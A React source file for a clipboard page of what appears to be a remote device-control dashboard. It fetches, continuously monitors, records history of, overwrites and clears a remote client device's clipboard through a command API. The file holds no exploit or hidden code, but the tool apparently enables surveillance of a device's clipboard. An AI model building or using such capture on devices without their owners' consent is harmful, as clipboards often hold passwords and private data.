import { useState, useCallback } from 'react';
import { useOutletContext } from 'react-router-dom';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext, ClipboardEntry } from '@/types';
import { CMD, normalizeClipboardList, extractList } from '@/types';
import { DevicePageHeader, EmptyState, ErrorAlert, LoadingSkeleton } from '@/components/device/shared';
import { DataActionsMenu, buildDataActions } from '@/components/device/DataActionsMenu';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Clipboard as ClipboardIcon, Eye, Send, Trash2, History, Clock } from 'lucide-react';
import { clientsApi } from '@/services/api';
import { useToast } from '@/components/ui/use-toast';

export default function ClipboardPage() {
  const { clientId, online } = useOutletContext<DeviceOutletContext>();
  const { toast } = useToast();

  // v4.0: write state
  const [writeText, setWriteText] = useState('');
  const [writeLoading, setWriteLoading] = useState(false);
  const [clearLoading, setClearLoading] = useState(false);

  // v4.0: history state (separate from live data)
  const [history, setHistory] = useState<ClipboardEntry[]>([]);
  const [historyLoading, setHistoryLoading] = useState(false);

  const { data: clipboard, loading, error, refresh, sendCommand, commandStatus, clearData } =
    useDeviceData<ClipboardEntry[]>({
      clientId,
      page: 'clipboard',
      extractData: (d) => {
        // v4.0: handle history response too
        if (d.type === 'history' && Array.isArray(d.history)) {
          setHistory(normalizeClipboardList(d.history));
          return [];
        }
        return normalizeClipboardList(extractList(d.list));
      },
      dataType: 'clipboard',
      defaultValue: [],
    });

  const dataActions = buildDataActions({ data: clipboard, exportPrefix: 'clipboard', onClear: clearData });

  const fetchClipboard = useCallback(async () => {
    await sendCommand(CMD.CLIPBOARD, { action: 'fetch' });
  }, [sendCommand]);

  const monitorClipboard = useCallback(async () => {
    await sendCommand(CMD.CLIPBOARD, { action: 'start' });
  }, [sendCommand]);

  // v4.0: write to device clipboard
  const writeToClipboard = useCallback(async () => {
    if (!writeText || !online) return;
    setWriteLoading(true);
    try {
      await clientsApi.sendCommand(clientId, CMD.CLIPBOARD, {
        action: 'write',
        text: writeText,
      });
      toast({ title: 'Written', description: 'Text pushed to device clipboard' });
      setWriteText('');
    } catch (e: any) {
      toast({ title: 'Write failed', description: e?.response?.data?.error || 'Error', variant: 'destructive' });
    } finally {
      setWriteLoading(false);
    }
  }, [clientId, online, writeText, toast]);

  // v4.0: clear device clipboard
  const clearDeviceClipboard = useCallback(async () => {
    if (!online) return;
    setClearLoading(true);
    try {
      await clientsApi.sendCommand(clientId, CMD.CLIPBOARD, { action: 'clear' });
      toast({ title: 'Cleared', description: 'Device clipboard cleared' });
    } catch (e: any) {
      toast({ title: 'Clear failed', description: e?.response?.data?.error || 'Error', variant: 'destructive' });
    } finally {
      setClearLoading(false);
    }
  }, [clientId, online, toast]);

  // v4.0: fetch session history
  const fetchHistory = useCallback(async () => {
    setHistoryLoading(true);
    try {
      await clientsApi.sendCommand(clientId, CMD.CLIPBOARD, { action: 'history' });
    } catch {}
    finally { setHistoryLoading(false); }
  }, [clientId]);

  // copy to local clipboard
  const copyText = useCallback((text: string) => {
    navigator.clipboard.writeText(text).catch(() => {});
    toast({ title: 'Copied', description: 'Copied to your clipboard' });
  }, [toast]);

  return (
    <div className="space-y-5">
      <DevicePageHeader
        title="Clipboard"
        subtitle={`${clipboard.length} live · ${history.length} history`}
        actions={[
          { label: 'Fetch', icon: ClipboardIcon, onClick: fetchClipboard, disabled: loading || !online },
          { label: 'Monitor', icon: Eye, onClick: monitorClipboard, disabled: loading || !online, variant: 'outline' },
        ]}
        moreActions={<DataActionsMenu actions={dataActions} disabled={loading} />}
        refresh={refresh}
        loading={loading}
        commandStatus={commandStatus}
      />

      {error && <ErrorAlert message={error} onRetry={refresh} />}

      {/* v4.0: Write + Clear controls */}
      <Card className="shadow-none">
        <CardContent className="p-3 space-y-2">
          <p className="text-xs font-medium text-muted-foreground uppercase tracking-wide">Write to Device Clipboard</p>
          <Textarea
            placeholder="Type text to push to the device's clipboard…"
            value={writeText}
            onChange={(e: React.ChangeEvent<HTMLTextAreaElement>) => setWriteText(e.target.value)}
            className="min-h-[72px] text-xs resize-none"
            disabled={!online}
          />
          <div className="flex items-center gap-2">
            <Button
              size="sm"
              onClick={writeToClipboard}
              disabled={!writeText || writeLoading || !online}
              className="gap-1.5"
            >
              <Send className="h-3.5 w-3.5" />
              {writeLoading ? 'Sending…' : 'Push to Device'}
            </Button>
            <Button
              size="sm"
              variant="outline"
              onClick={clearDeviceClipboard}
              disabled={clearLoading || !online}
              className="gap-1.5 text-destructive hover:text-destructive border-destructive/30 hover:bg-destructive/5"
            >
              <Trash2 className="h-3.5 w-3.5" />
              {clearLoading ? 'Clearing…' : 'Clear Device Clipboard'}
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Tabs: Live / History */}
      <Tabs defaultValue="live">
        <TabsList className="h-8">
          <TabsTrigger value="live" className="text-xs h-7 px-3">
            Live <Badge variant="secondary" className="ml-1.5 text-[9px] px-1 py-0">{clipboard.length}</Badge>
          </TabsTrigger>
          <TabsTrigger value="history" className="text-xs h-7 px-3" onClick={fetchHistory}>
            <History className="h-3 w-3 mr-1" />
            History <Badge variant="secondary" className="ml-1.5 text-[9px] px-1 py-0">{history.length}</Badge>
          </TabsTrigger>
        </TabsList>

        {/* Live tab */}
        <TabsContent value="live" className="mt-3">
          {loading && !error ? (
            <LoadingSkeleton rows={3} />
          ) : clipboard.length === 0 ? (
            <EmptyState
              icon={ClipboardIcon}
              title="No clipboard data"
              description="Click Fetch to retrieve current clipboard"
              action={{ label: 'Fetch', onClick: fetchClipboard, disabled: loading || !online, loading: commandStatus === 'sending' }}
            />
          ) : (
            <div className="space-y-2">
              {clipboard.map((item, i) => (
                <ClipCard key={`clip-${item.timestamp}-${i}`} item={item} onCopy={copyText} />
              ))}
            </div>
          )}
        </TabsContent>

        {/* History tab (last 20 from device session) */}
        <TabsContent value="history" className="mt-3">
          {historyLoading ? (
            <LoadingSkeleton rows={3} />
          ) : history.length === 0 ? (
            <EmptyState
              icon={History}
              title="No history yet"
              description="History captures clipboard changes during the active session (max 20)"
              action={{ label: 'Fetch History', onClick: fetchHistory, disabled: !online }}
            />
          ) : (
            <div className="space-y-2">
              {history.map((item, i) => (
                <ClipCard key={`hist-${item.timestamp}-${i}`} item={item} onCopy={copyText} dimmed />
              ))}
            </div>
          )}
        </TabsContent>
      </Tabs>
    </div>
  );
}

// ── ClipCard sub-component ───────────────────────────────────────────────────

function ClipCard({ item, onCopy, dimmed = false }: { item: ClipboardEntry; onCopy: (t: string) => void; dimmed?: boolean }) {
  return (
    <Card className={`shadow-none ${dimmed ? 'opacity-80' : ''}`}>
      <CardContent className="p-3">
        <div className="group relative">
          <pre className="font-mono text-xs break-all whitespace-pre-wrap bg-muted/50 rounded p-2 pr-16 max-h-28 overflow-y-auto">
            {item.text || '-'}
          </pre>
          <Button
            size="sm"
            variant="ghost"
            className="absolute right-1 top-1 h-6 px-2 text-[10px] opacity-0 group-hover:opacity-100 transition-opacity"
            onClick={() => onCopy(item.text || '')}
          >
            Copy
          </Button>
        </div>
        <div className="flex items-center gap-2 mt-1.5 text-[10px] text-muted-foreground flex-wrap">
          {dimmed && <Clock className="h-2.5 w-2.5" />}
          <span>{item.length ?? (item.text?.length ?? 0)} chars</span>
          {item.timestamp && <><span>·</span><span>{item.timestamp}</span></>}
          {item.label && (
            <><span>·</span><Badge variant="secondary" className="text-[9px] px-1 py-0">{item.label}</Badge></>
          )}
          {item.mimeType && (
            <><span>·</span><Badge variant="outline" className="text-[9px] px-1 py-0">{item.mimeType}</Badge></>
          )}
        </div>
      </CardContent>
    </Card>
  );
}
